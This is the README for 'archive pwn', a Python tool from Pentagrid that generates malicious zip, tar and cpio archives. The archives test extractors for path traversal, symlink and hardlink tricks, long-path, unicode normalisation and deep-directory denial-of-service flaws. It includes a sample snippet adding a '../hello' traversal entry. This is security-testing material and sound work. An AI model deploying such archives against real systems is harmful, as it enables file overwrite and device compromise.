`Pentagrid <https://www.pentagrid.ch/>`_'s ``archive pwn`` is a Python-based tool to create zip, tar and cpio archives to exploit common archive library issues and developer mistakes.

.. contents:: 
   :local:

Archive pwn
===========

This is just another tool to create archive formats (zip, tar, cpio only for now) which try to write outside of the current working directory when extracted.

It's a very old vulnerability class where a lot of things have been written about. Just to mention some of the most similar/best known ones:

- https://github.com/jwilk/traversal-archives - A tool that creates the simple examples we create here too, but with Makefiles. Supports more archive formats.
- https://github.com/0xless/slip - A proper command line tool that allows configuring the payloads. Supports no cpio, but some other archive formats we don't.
- https://github.com/snyk/zip-slip-vulnerability - Research about the topic
- https://www.pentagrid.ch/en/blog/wind-river-vxworks-tarextract-directory-traversal-vulnerability/ - One of our advisories where we exploited VxWorks tarExtract function, the blog post deep dives a little more into the different archive vulnerabilities

Our tool here is therefore not "new", but different. Advantages of this tool:

- Support for hardlinks in TAR files
- Includes the contents of the folder "folder-to-pack" in the archive. This is important if the attacked system first checks for the existance of certain files in the archive or even does signature checks on them (think "embedded device secure software update").
- Added some more complex examples (ideas often taken from old vulnerabilities), e.g. maximum Windows path length attckas, unicode normalisation, DoS via very deep directory
- Modifiable by people who like Python, easy to add your own idea of a malicious archive. The current working directory (cwd) will be changed to the "folder-to-pack" folder by the script. You can then easily add another test case, e.g.:

::

    attack_name = "my_example_archive_attack"
    for archive in creator.create(attack_name):
        try:
            archive.add_cwd_content() # Adds the entire content of the folder "folder-to-pack" to the archive
            archive.add_dir("an-example-dir") # Some unpacking libraries allow omitting this line (and therefore ignore missing parent directories, see next line) 
            archive.add_dir("an-example-dir/another-one")
            archive.add_dummy_file_at_path("an-example-dir/another-one/") # Adds a file according to naming convention, e.g. a file "an-example-dir/another-one/my_example_archive_attack_<archive-type>"
            archive.add_dummy_dir_at_path("an-example-dir/") # Adds a dir according to naming convention, e.g. a dir "an-example-dir/my_example_archive_attack_<archive-type>"
            archive.add_symlink("an-example-dir/another-one/A", "an-example-dir") # Adds a symlink an-example-dir/another-one/A -> an-example-dir
            archive.add_hardlink("an-example-dir/another-one/B", "an-example-dir") # Attention, no hardlink support for zip and cpio, will throw UnsupportedException and only create tars!
            archive.add_file("../hello", "darkness my old friend") # Creates an archive entry "../hello" with file content "darkness my old friend"
            archive.close()
        except UnsupportedException as e:
            Logger.info(e) if not 'ustar' in str(e) else "" # ustar tar archives have very limited space for filenames of certain lengths
            archive.close_and_remove()


Please be aware, the tool creates a lot of files (last time we checked 96'314 files).

Usage
=====

Make sure you have Python 3 and GNU cpio installed as "cpio" command (on Intel MacOS it will fall back on the cpio-2.14-darwin binary included). Put stuff you want to pack along with the attack into the archive into "folder-to-pack". Then just run in the directory with `python3 archive_pwn.py`. It will create an "output" folder.
